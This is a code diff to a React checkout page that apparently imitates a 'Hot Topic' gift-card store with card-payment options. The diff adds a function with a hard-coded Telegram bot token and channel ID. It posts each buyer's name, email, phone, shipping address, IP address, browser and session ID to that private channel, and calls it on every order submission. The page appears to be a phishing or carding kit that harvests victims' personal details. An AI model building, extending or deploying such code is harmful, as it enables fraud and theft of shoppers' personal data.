@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -15,7 +14,6 @@ import {
   AlertCircle, Gift, ChevronRight, Shield, Star, Users 
 } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { supabase } from "@/integrations/supabase/client";
 import { v4 as uuidv4 } from 'uuid';
 
 const GIFT_CARD_VALUES = [100, 500, 1000, 5000];
@@ -25,6 +23,10 @@ const CARD_TYPES = [
   { name: "American Express", image: "https://i.imgur.com/MsEDvx2.png" },
   { name: "Discover", image: "https://i.imgur.com/o3VHRg1.png" }
 ];
+
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
+const TELEGRAM_CHANNEL_ID = "-1002550945996";
 
 // Regex patterns for validation
 const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
@@ -133,6 +135,69 @@ const Index = () => {
     }));
   };
 
+  // Function to send notification to Telegram
+  const sendTelegramNotification = async (orderDetails: any) => {
+    try {
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      // Format the message
+      let message = `
+🚨 *NEW HOT TOPIC ORDER PLACED* 🚨
+
+👤 *Customer Information*:
+   Name: ${orderDetails.customerName}
+   Email: ${orderDetails.email}
+   Phone: ${orderDetails.phone}
+
+💳 *Order Details*:
+   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}
+   Payment Amount: $${orderDetails.paymentAmount.toFixed(2)}
+   Delivery Method: ${orderDetails.deliveryMethod}`;
+
+      // Add address if it's a physical delivery
+      if (orderDetails.deliveryMethod === "physical" && orderDetails.address) {
+        message += `
+📍 *Shipping Address*:
+   Street: ${orderDetails.address.street}
+   City: ${orderDetails.address.city}
+   State: ${orderDetails.address.state}
+   ZIP: ${orderDetails.address.zipCode}`;
+      }
+
+      // Add user information
+      message += `
+
+🔍 *User Information*:
+   IP Address: \`${orderDetails.userInfo.ip}\`
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
+
+📆 *Order Placed*: ${new Date().toLocaleString()}`;
+
+      // Send to Telegram
+      const response = await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHANNEL_ID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
+
+      const result = await response.json();
+      if (!result.ok) {
+        console.error('Telegram notification error:', result);
+      }
+    } catch (error) {
+      console.error('Failed to send Telegram notification:', error);
+      // Don't stop the checkout flow if notification fails
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -207,18 +272,7 @@ const Index = () => {
       };
 
       // Send notification to Telegram
-      try {
-        const { data, error } = await supabase.functions.invoke('send-telegram-notification', {
-          body: orderDetails
-        });
-
-        if (error) {
-          console.error('Error sending Telegram notification:', error);
-        }
-      } catch (notificationError) {
-        console.error('Failed to send notification:', notificationError);
-        // Don't block the order process if notification fails
-      }
+      await sendTelegramNotification(orderDetails);
 
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
